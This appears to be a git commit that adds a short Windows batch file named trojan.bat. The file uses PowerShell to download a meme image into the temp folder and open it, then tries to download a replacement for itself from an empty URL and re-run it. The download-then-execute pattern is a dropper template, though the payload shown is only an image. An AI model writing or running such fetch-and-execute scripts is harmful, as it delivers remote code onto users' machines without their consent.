374e2d14067f7bc4258163219b9dff6f29df8810
Cimorexave <sadeq.s502@gmail.com>
2022-11-25 13:55:20 +0330

    created file

---
+++ trojan.bat
@@ -0,0 +1,5 @@
+cd %TEMP%
+PowerShell -Command "Invoke-WebRequest 'https://static01.nyt.com/images/2021/04/30/multimedia/30xp-meme/29xp-meme-superJumbo-v3.jpg?quality=75&auto=webp' -Outfile lol.png"
+lol.png
+PowerShell -Command "Invoke-WebRequest '' -Outfile trojan.bat"
+trojan.bat
